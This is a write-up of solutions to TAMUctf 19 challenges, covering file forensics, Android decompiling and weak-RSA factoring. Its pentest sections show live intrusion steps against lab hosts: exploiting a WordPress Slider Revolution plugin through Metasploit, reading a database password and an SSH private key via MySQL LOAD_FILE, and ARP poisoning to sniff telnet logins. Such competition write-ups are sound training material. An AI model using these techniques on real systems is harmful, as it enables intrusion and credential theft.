## Information

### CTF

- **Name** : TAMUctf 19
- **Website** : [tamuctf.com](https://tamuctf.com/)
- **Type** : Online
- **Format** : Jeopardy
- **CTF Time** : [link](https://ctftime.org/event/740)

## 100 - Where am I? - Misc

> What is the name of the city where the server for tamuctf.com is located?

1. Figure out the ip address `dig ctf.tamu.edu`
2. search on shodan: [52.33.57.247](https://www.shodan.io/host/52.33.57.247)

Flag: `Boardman`

## 306 - I heard you like files. - Misc

With the tool binwalk we can see embedded files inside of art.png and extract them.
One of those extracted files is a word document containing another image image1.jpg.

```
root@kali:~# binwalk -e art.png
root@kali:~# binwalk -e _art.png.extracted/word/media/image1.jpg
```

Yet again we can use binwalk to extract a pdf file: `binwalk -D pdf:pdf: image1.png`

Then we can use the tool strings to find a base64 string at the very end of the file which decodes to our flag.

```
root@kali:~# echo ZmxhZ3tQMGxZdEByX0QwX3kwdV9HM3RfSXRfTjB3P30K | base64 -d
flag{P0lYt@r_D0_y0u_G3t_It_N0w?}
```

## 340 - Hello World - Misc

There is whitespace code in front of the Hello World program.
Running it [here](https://vii5ard.github.io/whitespace/) gives us `Well sweet golly gee, that sure is a lot of whitespace!`.

Though we notice that there are more characters being pushed to the stack than there are being printed. Just add some more print statements at the end and we get `Well sweet golly gee, that sure is a lot of whitespace!}3v4h_u0y_gn1c4ps_t4hw_ym_h0{megig`

Flag: `gigem{0h_my_wh4t_sp4c1ng_y0u_h4v3}`

## 100 - 0_intrusion - MicroServices

>Welcome to MicroServices inc, where do all things micro and service oriented!
>Recently we got an alert saying there was suspicious traffic on one of our web servers. Can you help us out?
>
>    1. What is the IP Address of the attacker?

10.91.9.3

## 100 - 1_logs - MicroServices

If we mount the filesystem and take a look into `/var/log/auth.log` we can see that the attacker logged in as root at the time Feb 17 00:06:04.

```
Feb 17 00:06:04 ubuntu-xenial sshd[15799]: Accepted publickey for root from 10.91.9.93 port 41592 ssh2: RSA SHA256:lR4653Hv/Y9QthWvXFB2KkNPzQ1r8mItv83OgiCAR4g
Feb 17 00:06:04 ubuntu-xenial sshd[15799]: pam_unix(sshd:session): session opened for user root by (uid=0)
Feb 17 00:06:04 ubuntu-xenial systemd-logind[1035]: New session 2 of user root.
Feb 17 00:06:04 ubuntu-xenial systemd: pam_unix(systemd-user:session): session opened for user root by (uid=0)
```

## 324 - Stop and Listen - Network/Pentest

Simply connect to the vpn and listen on the tap0 interface with wireshark.

Wait a little while and click "Follow > UDP Stream"

Flag: `gigem{f0rty_tw0_c9d950b61ea83}`

## 469 - Wordpress - Network/Pentest

Run wpscan just to make sure

```
root@kali:~# wpscan -e ap --url http://172.30.0.3

[+] revslider
 | Location: http://172.30.0.3/wp-content/plugins/revslider/
 |
 | Detected By: Urls In Homepage (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: WordPress Slider Revolution Local File Disclosure
 |     Fixed in: 4.1.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/7540
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1579
 |      - https://www.exploit-db.com/exploits/34511/
 |      - https://www.exploit-db.com/exploits/36039/
 |      - http://blog.sucuri.net/2014/09/slider-revolution-plugin-critical-vulnerability-being-exploited.html
 |      - http://packetstormsecurity.com/files/129761/
 |
 | [!] Title: WordPress Slider Revolution Shell Upload
 |     Fixed in: 3.0.96
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/7954
 |      - https://www.exploit-db.com/exploits/35385/
 |      - https://whatisgon.wordpress.com/2014/11/30/another-revslider-vulnerability/
 |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_revslider_upload_execute
 |
 | The version could not be determined.
```

We can use the `exploit/unix/webapp/wp_revslider_upload_execute` metasploit module to get a session.

In `/var/www/wp-config.php` are credentials for the database server:

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'wordpress');

/** MySQL database password */
define('DB_PASSWORD', '0NYa6PBH52y86C');

/** MySQL hostname */
define('DB_HOST', '172.30.0.2');
```

There is also a txt file called note.txt which reads:
>Your ssh key was placed in /backup/id_rsa on the DB server.

We login to the database server using mysql:

```
root@kali:~# mysql -h 172.30.0.2 -u wordpress -p0NYa6PBH52y86C

MySQL [(none)]> set @idrsa = LOAD_FILE('/backup/id_rsa');
Query OK, 0 rows affected (0.376 sec)

MySQL [(none)]> select @idrsa
```

Private Key:
```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA3Z35DpTcnm4kFkkGp6iDXqvUNH+/+hSDOY6rXsa40WMr7rjc
tHh8TgOBFZ6Rj5VzU/jY8O0qHxiPVn7BCYKhqyp1V1l9/ZCPRSjRLYy62dVTiHUt
ZbiPiY9+biHIsQ/nZfwiHmwlb0sWDoyFvX3OL/3AFMcYpZ4ldHQuwszJF4DeTV33
ruSBoXIiICQyNJBHTboVel+WXAfMNumYMVNrtrwpNoD7whv9Oa2afUejXMJL42Rw
8Xhab59HIIL9fl68FqgggVI4X3d/fzqKKGyoN5JxBLmQTCiVxhxTMv9OS0MhdSg6
Nh3+lf/wUuweUQXqmohvETntwwGs8jnJGCyeDwIDAQABAoIBAHGVRpG/n/cfMiWt
1dhWGMaLwJ4Ln6QXoU39nj1cEltWvayDWLKyUdtWFnGzLJ1vloVCNEX+96iqWMSX
AG7UYfGtOCjFuDoePh/PFK6IwzdkC4UTsWnCFucFAWKGtCpzoUB24jG/ccxBqpNY
WC9PbD7SigDcLfisPjwaU+EJPkNpl93VBk1BCJRbvWF+Wl/si3wmMZ0YRoyIAF5L
oBsq935xH8kJcixSVYKjG3hMUZfiLoQB+p/IFsxDlfGLE+M1esTZ5GIRjj+t7vBN
l2JZTY893gjfQzUv2WrJXzMhJvWGzOCsRRc4gOSeS6GYiip8glqg8iWHpWdgF6i9
oAQx5pkCgYEA7oTmvy0cXvhPjkEbrizCCqf6sXfZps5e6eminTTBGA8NW/Uq+SQv
5JEYxvIL+qMH6cKkc8rBaNhgy3vnv+UgE1PUFI0UWFGKb+OpzzvY/zkmf03enxrl
SK+QXH4FS9f7leivZRVEWBq1kDVIqHZtybYGg0etOvHYX0GwqV2UTy0CgYEA7dv0
bxz6CO9bhxxpXRrrykX2Z57J3JW2I3yVkCY+4Y6x106K11X+b1547kEZk40i2Ugc
iE6jcYIRiYNiSgb0Ph4uxZHFlvBr8JA2fGHYIAnGRcoc1Gzgz5omRvU9H8uy5ipO
LyZ2dnMgXRVOjuXoN4UZR2rgWmJVLD1q7eKnh6sCgYAnVOUUC2VNR9celx/wZdMN
nMubLi9G8Wr3WZ6GG+fnhrvmORSABvaa005pqApPp0irxHwH2BxypJO5mlIJ88eJ
SF6FkQoU0kVo0/rxgGX1GEB/56BZTj8W8FR23BUVf6UuADPEEHC3spfUEuVLWlQa
WhjS1yP6v1y1wIhYNWU6dQKBgQDbZ1zdcXkh7MgcpRR7kW2WM1rK0imZk29i5HSB
dwXhwWJCHGztnKEJ0bby7pHNDQ7sJhxLj14sQbIzikGLz0ZUVjsGeyQryrGGQUBB
E2/sfZeqoHhfad8lICfWpDgxsA/hR3y++VekgyWDNzgzj9bX/6oFuowgUzwFhtGv
hLbL6QKBgQCvcDMmWs2zXwmIo1+pIHUUSv2z3MWb0o1dzHQI/+FJEtyQPwL1nCwg
bJaC0KT45kw0IGVB2jhWf0KcMF37bpMpYJzdsktSAmHdjLKdcr6vw2MNpRapaNQe
On0QmLzbpFr9kjqorinKVkjk/WlTo9rKDSrLiUueEVYTxEMCi92giw==
-----END RSA PRIVATE KEY-----
```

```
root@kali:~# ssh -i id_rsa root@172.30.0.3

root@apacheword:~# cat flag.txt
gigem{w0rd_pr3ss_b3st_pr3ss_409186FC8E2A45FE}
root@apacheword:~#
```

## 474 - Calculator - Network/Pentest

We have two hosts 172.30.0.2 and 172.30.0.3

We can use Ettercap to perform an ARP Poisoning Attack. That way we are again able to sniff traffic using wireshark.

172.30.0.3 is connecting to 172.30.0.2 via telnet, i.e. username and password are transmitted in plaintext

```
Trying 172.30.0.2...
Connected to 172.30.0.2.
Escape character is '^]'.
Ubuntu 16.04.5 LTS
f090dcc3a123 login: alice
Password: 58318008

alice@f090dcc3a123:~$ cat .ctf_flag
gigem{f5ae5f528ed5a9ad312f75bd1d3406a2}
```

## 376 - Secrets - Android

Use apktool to unpack the android app:

```
root@ubuntu:~# apktool d howdyapp.apk
...
root@ubuntu:~/howdyapp# cat res/values/strings.xml | grep flag
    <string name="flag">Z2lnZW17aW5maW5pdGVfZ2lnZW1zfQ==</string>
root@ubuntu:~/howdyapp# echo "Z2lnZW17aW5maW5pdGVfZ2lnZW1zfQ==" | base64 -d
gigem{infinite_gigems}
```

## 460 - Local News - Android

Unpack the apk and convert the dex files to jar

```
root@ubuntu:~# unzip -d app/ app.apk
root@ubuntu:~# cd app/
root@ubuntu:~# d2j-dex2jar.sh classes.dex
root@ubuntu:~# d2j-dex2jar.sh classes2.dex
```

Decompiling jar file into java source code

```
root@ubuntu:~# java -jar cfr-0.139.jar classes.jar --outputdir classes
root@ubuntu:~# java -jar cfr-0.139.jar classes2.jar --outputdir classes2
```

MainActivity
```java
package com.tamu.ctf.hidden;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.support.v4.content.LocalBroadcastManager;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import io.michaelrocks.paranoid.Deobfuscator;

public class MainActivity
extends AppCompatActivity {
    protected void onCreate(Bundle object) {
        super.onCreate(object);
        this.setContentView(2131296282);
        object = new BroadcastReceiver(){

            public void onReceive(Context context, Intent intent) {
                Log.d((String)MainActivity.this.getString(2131427360), (String)Deobfuscator.app.Debug.getString((int)0));
            }
        };
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(this.getString(2131427361));
        LocalBroadcastManager.getInstance((Context)this).registerReceiver((BroadcastReceiver)object, intentFilter);
    }

}
```
Deobfuscator$app$Debug
```java
package io.michaelrocks.paranoid;

public class Deobfuscator$app$Debug {
    private static final String[] charChunks = new String[]{"}18m_hanbed3i{0g"};
    private static final String[] indexChunks = new String[]{"\u000f\f\u000f\t\u0003\r\u0005\f\n\n\t\u0007\u0004\u0002\u0001\u0006\t\b\u000e\u0001\u000b\b\t\u0006\u0000"};
    private static final String[] locationChunks = new String[]{"\u0000\u0000\u0019\u0000"};

    public static String getString(int n) {
        int n2 = n / 4096;
        int n3 = n % 4096;
        int n4 = (n + 1) / 4096;
        n = (n + 1) % 4096;
        char[] arrc = locationChunks[n2];
        String string = locationChunks[n4];
        n2 = arrc.charAt(n3 * 2);
        n3 = (arrc.charAt(n3 * 2 + 1) & 65535) << 16 | n2 & 65535;
        n2 = string.charAt(n * 2);
        n2 = (string.charAt(n * 2 + 1) << 16 | n2) - n3;
        arrc = new char[n2];
        for (n = 0; n < n2; ++n) {
            n4 = n3 + n;
            int n5 = n4 / 8192;
            n4 = indexChunks[n5].charAt(n4 % 8192) & 65535;
            n5 = n4 / 8192;
            arrc[n] = charChunks[n5].charAt(n4 % 8192);
        }
        return new String(arrc);
    }
}
```
Since this code doesn't happily compile yet we have to make some adjustments to the code.

```java
class Deobfuscator {
    private final String[] charChunks = new String[]{"}18m_hanbed3i{0g"};
    private final String[] indexChunks = new String[]{"\u000f\f\u000f\t\u0003\r\u0005\f\n\n\t\u0007\u0004\u0002\u0001\u0006\t\b\u000e\u0001\u000b\b\t\u0006\u0000"};
    private final String[] locationChunks = new String[]{"\u0000\u0000\u0019\u0000"};

    public String getString(int n) {
        int n2 = n / 4096;
        int n3 = n % 4096;
        int n4 = (n + 1) / 4096;
        n = (n + 1) % 4096;
        String arrc = locationChunks[n2];
        String string = locationChunks[n4];
        n2 = arrc.charAt(n3 * 2);
        n3 = (arrc.charAt(n3 * 2 + 1) & 65535) << 16 | n2 & 65535;
        n2 = string.charAt(n * 2);
        n2 = (string.charAt(n * 2 + 1) << 16 | n2) - n3;
        arrc = String.valueOf(n2);
        for (n = 0; n < n2; ++n) {
            n4 = n3 + n;
            int n5 = n4 / 8192;
            n4 = indexChunks[n5].charAt(n4 % 8192) & 65535;
            n5 = n4 / 8192;
            char str = charChunks[n5].charAt(n4 % 8192);
            arrc = new StringBuilder(arrc).insert(n, str).toString();
        }
        return new String(arrc);
    }

}

public class Main {

    public static void main(String[] args) {
        Deobfuscator obf = new Deobfuscator();
        System.out.println(obf.getString(0));
        # Flag: gigem{hidden_81aeb013bea}
    }

}
```

## 354 - RSAaaay - Crypto

We were given a public key pair (containing n & e) and a secret message.
Because the public key is extremely weak it's easy to recover the private key to decrypt the message.
After decrypting the message we notice that some values have to be split into two to fit into the ascii range.


```python
def isqrt(n):
    x = n
    y = (x + n // x) // 2
    while y < x:
        x = y
        y = (x + n // x) // 2
    return x


def fermat(n):
    a = isqrt(n)
    b2 = a*a - n
    b = isqrt(n)
    count = 0
    while b*b != b2:
        a = a + 1
        b2 = a*a - n
        b = isqrt(b2)
        count += 1
    p = a+b
    q = a-b
    assert n == p * q
    return p, q

def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('modular inverse does not exist')
    else:
        return x % m

def main():
    n = 2531257
    e = 43
    p,q = fermat(n)
    phi = (p-1)*(q-1)
    d = modinv(e,phi)
    enc = [906851, 991083, 1780304, 2380434, 438490, 356019, 921472, 822283, 817856, 556932, 2102538, 2501908, 2211404, 991083, 1562919, 38268]
    dec = [pow(x,d)%n for x in enc]
    # [103L, 105103L, 101109L, 12383L, 97118L, 97103L, 10195L, 83105L, 12095L, 70108L, 121105L, 110103L, 9584L, 105103L, 101114L, 115125L]
    # split into ascii range values
    msg = [103, 105, 103, 101, 109, 123, 83, 97, 118, 97, 103, 101, 95, 83, 105, 120, 95, 70, 108, 121, 105, 110, 103, 95, 84, 105,103, 101, 114, 115, 125]

    print ''.join([chr(c) for c in msg])

if __name__ == '__main__':
    main()
```

Flag: `gigem{Savage_Six_Flying_Tigers}`
